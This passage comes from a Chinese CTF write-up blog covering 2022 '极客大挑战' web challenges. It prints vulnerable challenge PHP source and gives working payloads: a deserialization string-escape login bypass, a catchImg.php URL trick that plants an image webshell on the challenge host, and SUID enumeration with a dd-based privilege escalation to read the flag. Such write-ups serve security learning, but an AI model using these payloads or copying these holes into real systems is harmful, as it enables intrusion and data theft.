+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;option&#x27;</span>])) <span class="hljs-keyword">die</span>();<br><span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;option&#x27;</span>]);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$str</span> != <span class="hljs-literal">NULL</span>)&#123;<br>   <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;:Where is the source code of config.php?&#x27;</span>;<br>   &#125;<br><br><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;./config.php&#x27;</span>);<br><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;|\$option=\&#x27;.*\&#x27;;|&#x27;</span>, <span class="hljs-string">&quot;\$option=&#x27;<span class="hljs-subst">$str</span>&#x27;;&quot;</span>, <span class="hljs-variable">$file</span>);<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&#x27;./config.php&#x27;</span>, <span class="hljs-variable">$file</span>);<br><br></code></pre></td></tr></table></figure>
+
+<p>config.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$option</span>=<span class="hljs-string">&#x27;chinfo&#x27;</span>;<br></code></pre></td></tr></table></figure>
+
+<p>可参考p神的正则经典漏洞</p>
+<h2 id="Loginintomyheart"><a href="#Loginintomyheart" class="headerlink" title="Loginintomyheart"></a>Loginintomyheart</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004064.png" srcset="/img/loading.gif" lazyload alt="image-20221122221448066"></p>
+<p>loginfo.php</p>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">你的登录凭证为：TzozOiJMb<span class="hljs-number">2</span>ciOj<span class="hljs-name">M6</span>e<span class="hljs-number">3</span><span class="hljs-name">M6</span>ODoicGFzc<span class="hljs-number">3</span>d<span class="hljs-attr">vcmQiO3</span><span class="hljs-name">M6</span>MzI<span class="hljs-number">6</span>ImQ<span class="hljs-number">0</span>MWQ<span class="hljs-number">4</span>Y<span class="hljs-number">2</span>Q<span class="hljs-number">5</span>OGYwMGIyMDRlOTgwMDk<span class="hljs-number">5</span>OGVjZj<span class="hljs-name">g0</span>MjdlIjtzOj<span class="hljs-name">g6</span>I<span class="hljs-symbol">nVzZXJuYW1</span>lIjtO<span class="hljs-meta">O3</span><span class="hljs-name">M6</span><span class="hljs-symbol">NzoiaXNsb2</span>dpbiI<span class="hljs-number">7</span>aTow<span class="hljs-meta">O30</span>=<br></code></pre></td></tr></table></figure>
+
+<p>admin&#x2F;admin</p>
+<p>O:3:”Log”:3:{s:8:”password”;s:32:”21232f297a57a5a743894a0e4a801fc3”;s:8:”username”;s:5:”hacker”;s:7:”islogin”;i:0;}</p>
+<p>VanZY&#x2F;123456</p>
+<p>O:3:”Log”:3:{s:8:”password”;s:32:”276f722736c95d99e921722cf9ed621c”;s:8:”username”;s:5:”VanZY”;s:7:”islogin”;i:0;}</p>
+<p>发现admin被替换为hacker</p>
+<p>5–&gt;6</p>
+<p>正是之前提到的反序列化字符逃逸</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">&quot;;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;islogin&quot;</span>;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>;&#125;<br></code></pre></td></tr></table></figure>
+
+<p>21字符</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">&quot;;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;islogin&quot;</span>;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">1</span>;&#125;<br></code></pre></td></tr></table></figure>
+
+<p>payload</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&quot;;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;islogin&quot;</span>;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">1</span>;&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004065.png" srcset="/img/loading.gif" lazyload alt="image-20221122230521380"></p>
+<p>SYC{5Yir5b2T6IiU54uX5LqG5aW95ZCXW&#x2F;CfmIVd77yM55yf6Jm+5aS0}</p>
+<p>别当舔狗了好吗[😅]，真虾头</p>
+<h2 id="edit-php（赛后）"><a href="#edit-php（赛后）" class="headerlink" title="edit_php（赛后）"></a>edit_php（赛后）</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004066.png" srcset="/img/loading.gif" lazyload alt="image-20221122231101304"></p>
+<p>第一次创建目录的时候可以看到&#x2F;catchImg.php?file_url&#x3D;example.jpg</p>
+<p>随便输入一个文件名，</p>
+<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004068.png" srcset="/img/loading.gif" lazyload alt="image-20221122233134448"></p>
+<p>后面发现可以读取远程文件</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">file_url=http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/showImage.php<br></code></pre></td></tr></table></figure>
+
+<p>可惜的是名字不可控，md5加密了。</p>
+<h3 id="赛后复现"><a href="#赛后复现" class="headerlink" title="赛后复现"></a>赛后复现</h3><p>类似于Ueditor的任意文件上传，采用</p>
+<p>127.0.0.1&#x2F;shell.jpg?.php</p>
+<p>使文件保存时解析为php文件</p>
+<p>首先在VPS上放一个图片马，接着</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">49.235</span>.<span class="hljs-number">109.5</span>:<span class="hljs-number">8302</span><span class="hljs-regexp">/catchImg.php?file_url=http:/</span><span class="hljs-regexp">/127.0.0.1/</span>shell.jpg?.php<br></code></pre></td></tr></table></figure>
+
+<p>接着在<a target="_blank" rel="noopener" href="http://49.235.109.5:8302/showImage.php%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E5%9B%BE%E7%89%87%E9%A9%AC%E7%9A%84%E8%B7%AF%E5%BE%84">http://49.235.109.5:8302/showImage.php可以看到图片马的路径</a></p>
+<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004069.png" srcset="/img/loading.gif" lazyload alt="image-20221127154158916"></p>
+<p>直接getshell</p>
+<p>flag在根目录</p>
+<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004070.png" srcset="/img/loading.gif" lazyload alt="image-20221127155113827"></p>
+<p>但是直接读取读取不上，可能权限不够，反弹shell看看</p>
+<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004071.png" srcset="/img/loading.gif" lazyload alt="image-20221127161117042"></p>
+<p>权限不够，SUID提权</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">find</span> / -user root -perm -4000 -<span class="hljs-built_in">print</span> 2&gt;/dev/<span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004072.png" srcset="/img/loading.gif" lazyload alt="image-20221127161206455"></p>
+<p>发现dd有suid权限，使用此命令读取flag</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">dd <span class="hljs-attribute">if</span>=f1ag_is_here_y0u_k0nw <span class="hljs-attribute">of</span>=/flag<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004073.png" srcset="/img/loading.gif" lazyload alt="image-20221127161317696"></p>
+<p>成功读取出flag。</p>
+<h3 id="附件"><a href="#附件" class="headerlink" title="附件"></a>附件</h3><p>index.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;div align=<span class="hljs-string">&quot;center&quot;</span>&gt;<br>    &lt;img src=<span class="hljs-string">&quot;./img/SYC.jpg&quot;</span> width=<span class="hljs-string">&quot;600&quot;</span> height=<span class="hljs-string">&quot;400&quot;</span> &gt;<br>&lt;/div&gt;<br>&lt;h2&gt;&lt;a href=<span class="hljs-string">&#x27;/setCookie.php&#x27;</span> align=<span class="hljs-string">&quot;center&quot;</span>&gt;创建/进入你的私人相册&lt;/a&gt;&lt;/h2&gt;<br></code></pre></td></tr></table></figure>
+
+<p>photo.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>	&lt;head&gt;<br>		&lt;meta charset=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;<br>		&lt;title&gt;<span class="hljs-number">3</span>dPhoto&lt;/title&gt;<br>		&lt;link rel=<span class="hljs-string">&quot;stylesheet&quot;</span> type=<span class="hljs-string">&quot;text/css&quot;</span> href=<span class="hljs-string">&quot;./photo.css&quot;</span>/&gt;<br>	&lt;/head&gt;<br>	&lt;body&gt;<br>		&lt;div <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">show</span>&quot;&gt;</span><br><span class="hljs-class">			&lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">box</span>&quot;&gt;</span><br><span class="hljs-class">			&lt;?<span class="hljs-title">php</span> </span><br><span class="hljs-class">			$<span class="hljs-title">path</span> = $<span class="hljs-title">_COOKIE</span>[&#x27;<span class="hljs-title">path</span>&#x27;];</span><br><span class="hljs-class">			$<span class="hljs-title">dirArr</span> = <span class="hljs-title">scandir</span>(&#x27;./<span class="hljs-title">upload</span>/&#x27;.$<span class="hljs-title">path</span>.&#x27;/&#x27;);</span><br><span class="hljs-class">			<span class="hljs-title">foreach</span>($<span class="hljs-title">dirArr</span> <span class="hljs-title">as</span> $<span class="hljs-title">f</span>)</span>&#123;<br>				<span class="hljs-keyword">if</span>(<span class="hljs-variable">$f</span> !== <span class="hljs-string">&#x27;.&#x27;</span> &amp;&amp; <span class="hljs-variable">$f</span> !== <span class="hljs-string">&#x27;..&#x27;</span>)&#123;<br>					<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=\&quot;&quot;</span>.<span class="hljs-string">&#x27;./upload/&#x27;</span>.<span class="hljs-variable">$path</span>.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$f</span>.<span class="hljs-string">&quot;\&quot; &gt;&quot;</span>;<br>				&#125;<br>			&#125;<br>			<span class="hljs-meta">?&gt;</span><br>			&lt;/div&gt;<br>		&lt;/div&gt;<br>        &lt;h3&gt;<br>        &lt;/h3&gt;<br>	&lt;/body&gt;<br>&lt;/html&gt;<br><br></code></pre></td></tr></table></figure>
+
+<p>showimage.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-string">&#x27;upload/&#x27;</span>.<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;path&#x27;</span>].<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&#x27;example&#x27;</span>).<span class="hljs-string">&quot;.jpg&quot;</span>))&#123;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;photo.php&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=&#x27;center&#x27;&gt;&lt;a href=&#x27;/catchImg.php?file_url=example.jpg&#x27;&gt;获取实例图片&lt;/a&gt;&lt;/h2&gt;&quot;</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>setCookie.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">uuid</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123;  <br>    <span class="hljs-variable">$chars</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">uniqid</span>(<span class="hljs-title function_ invoke__">mt_rand</span>(), <span class="hljs-literal">true</span>));  <br>    <span class="hljs-variable">$uuid</span> = <span class="hljs-title function_ invoke__">substr</span> ( <span class="hljs-variable">$chars</span>, <span class="hljs-number">0</span>, <span class="hljs-number">8</span> ) . <span class="hljs-string">&#x27;-&#x27;</span><br>            . <span class="hljs-title function_ invoke__">substr</span> ( <span class="hljs-variable">$chars</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span> ) . <span class="hljs-string">&#x27;-&#x27;</span> <br>            . <span class="hljs-title function_ invoke__">substr</span> ( <span class="hljs-variable">$chars</span>, <span class="hljs-number">12</span>, <span class="hljs-number">4</span> ) . <span class="hljs-string">&#x27;-&#x27;</span><br>            . <span class="hljs-title function_ invoke__">substr</span> ( <span class="hljs-variable">$chars</span>, <span class="hljs-number">16</span>, <span class="hljs-number">4</span> ) . <span class="hljs-string">&#x27;-&#x27;</span><br>            . <span class="hljs-title function_ invoke__">substr</span> ( <span class="hljs-variable">$chars</span>, <span class="hljs-number">20</span>, <span class="hljs-number">12</span> ); <br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$uuid</span> ;  <br>&#125;  <br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;path&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">setcookie</span>(<span class="hljs-string">&#x27;path&#x27;</span>,<span class="hljs-title function_ invoke__">uuid</span>());<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;refresh: 2;&quot;</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;创建成功&quot;</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location:/showImage.php&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>
+
+<p>catchImg.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;path&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: /index.php&quot;</span>);<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$path</span> = <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;path&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-string">&#x27;upload/&#x27;</span>.<span class="hljs-variable">$path</span>))&#123;<br>        <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-string">&#x27;upload/&#x27;</span>.<span class="hljs-variable">$path</span>);<br>        <span class="hljs-title function_ invoke__">chmod</span>(<span class="hljs-string">&#x27;upload/&#x27;</span>.<span class="hljs-variable">$path</span>,<span class="hljs-number">0755</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>        <span class="hljs-variable">$uri</span> = <span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$str</span>, <span class="hljs-number">5</span>);<br>        <span class="hljs-variable">$checklist</span> = [<span class="hljs-string">&#x27;gif&#x27;</span>,<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>];<br>        <span class="hljs-variable">$ext</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$uri</span>,<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$uri</span>,<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$ext</span>,<span class="hljs-variable">$checklist</span>))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$uri</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file_url&#x27;</span>]))&#123;<br>            <span class="hljs-variable">$contents</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file_url&#x27;</span>]);<br>            <span class="hljs-variable">$ext</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file_url&#x27;</span>], <span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file_url&#x27;</span>], <span class="hljs-string">&quot;.&quot;</span>) + <span class="hljs-number">1</span>);<br>            <span class="hljs-variable">$uri</span> = <span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file_url&#x27;</span>]);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$uri</span> !== <span class="hljs-string">&quot;&quot;</span>)&#123;<br>                <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$uri</span>,<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$uri</span>,<span class="hljs-string">&#x27;/&#x27;</span>)?<span class="hljs-number">0</span>:<span class="hljs-number">1</span>,<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$uri</span>,<span class="hljs-string">&#x27;.&#x27;</span>)-(<span class="hljs-string">&#x27;&#x27;</span>==<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$uri</span>,<span class="hljs-string">&#x27;/&#x27;</span>)?<span class="hljs-number">0</span>:<span class="hljs-number">1</span>));<br>                <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&#x27;upload/&#x27;</span>.<span class="hljs-variable">$path</span>.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$file_name</span>).<span class="hljs-string">&#x27;.&#x27;</span>.<span class="hljs-variable">$ext</span>,<span class="hljs-variable">$contents</span>);<br>            &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no resource!&quot;</span>;<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: /index.php&quot;</span>);<br>        <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>        <span class="hljs-keyword">exit</span>();<br>    &#125;<br>&#125;<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;refresh: 0;url=/showImage.php&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;success&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/writeup/" class="category-chain-item">writeup</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/web/">#web</a>
+      
+        <a href="/tags/2022/">#2022</a>
+      
+        <a href="/tags/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/">#极客大挑战</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>2022_极客大挑战</div>
+      <div>https://emoment.top/2023/01/10/2022-极客大挑战/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Aru3h@rk</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年1月10日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2023年1月10日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/01/10/2022-%E6%B2%B3%E5%8D%97%E7%9C%81%E9%87%91%E7%9B%BE%E4%BF%A1%E5%AE%89%E6%9D%AF/" title="2022_河南省金盾信安杯">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">2022_河南省金盾信安杯</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/01/10/2022-UNCTF/" title="2022_UNCTF">
+                        <span class="hidden-mobile">2022_UNCTF</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div style="font-size: 0.85rem"> <span id="website-duration">载入网站运行时间...</span> <script src="/js/duration.js"></script> </div>  
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
